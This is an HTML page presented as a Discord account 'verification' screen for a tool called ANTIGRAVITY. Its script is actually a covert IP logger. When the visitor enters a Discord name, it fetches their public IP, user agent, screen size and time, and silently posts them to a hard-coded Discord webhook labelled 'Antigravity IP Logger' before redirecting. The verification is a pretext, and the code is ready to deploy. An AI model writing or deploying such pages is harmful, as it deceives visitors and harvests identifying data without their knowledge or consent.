<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANTIGRAVITY | Verification</title>
    <style>
        body { margin:0; background:#0a0a0a; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        .container { text-align:center; max-width:420px; padding:20px; }
        h1 { color:#bb86fc; }
        input { width:100%; padding:14px; background:#1f1f1f; border:2px solid #7c3aed; color:white; border-radius:8px; font-size:17px; margin:15px 0; box-sizing:border-box; }
        button { padding:14px 50px; background:#7c3aed; color:white; border:none; border-radius:8px; font-size:16px; cursor:pointer; margin-top:10px; }
        .spinner { display:none; width:40px; height:40px; border:5px solid #7c3aed; border-top-color:transparent; border-radius:50%; animation:spin 0.8s linear infinite; margin:20px auto; }
        @keyframes spin { to { transform:rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container" id="verifyScreen">
        <h1>ANTIGRAVITY</h1>
        <p>Verify your Discord account to access the tool</p>
        <input type="text" id="discordName" placeholder="Your Discord Username (e.g. username#1234)" autocomplete="off">
        <button onclick="verify()">VERIFY ACCOUNT</button>
    </div>

    <div class="container" id="loadingScreen" style="display:none;">
        <h1>ANTIGRAVITY</h1>
        <p>Authenticating...</p>
        <div class="spinner" style="display:block;"></div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1521997826131755028/uql6ytOp1rIMLN6kXac5nXrRgpvMH-kcB9G9L9edsPZUCKKllIwNzBwCbiQiFi9ax6Og";

        async function sendLog(discordName) {
            let info = { 
                ip: "N/A", 
                discord: discordName || "Not provided",
                ua: navigator.userAgent, 
                screen: screen.width+"x"+screen.height, 
                time: new Date().toLocaleString() 
            };
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                info.ip = (await r.json()).ip;
            } catch(e){}
            
            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "🌐 Antigravity IP Logger",
                        embeds: [{
                            title: "🔗 Tool Accessed",
                            color: 0x9b59b6,
                            description: "**Discord Name:** " + info.discord,
                            fields: [
                                {name: "IP", value: info.ip, inline: true},
                                {name: "Screen", value: info.screen, inline: true},
                                {name: "UA", value: info.ua.substring(0, 350), inline: false},
                                {name: "Time", value: info.time, inline: false}
                            ]
                        }]
                    })
                });
            } catch(e){}
        }

        async function verify() {
            const name = document.getElementById('discordName').value.trim();
            if (!name) {
                alert("Please enter your Discord name");
                return;
            }

            document.getElementById('verifyScreen').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';

            await sendLog(name);
            
            setTimeout(() => {
                window.location.href = "page.html"; // change to your main file name
            }, 1500);
        }
    </script>
</body>
</html>
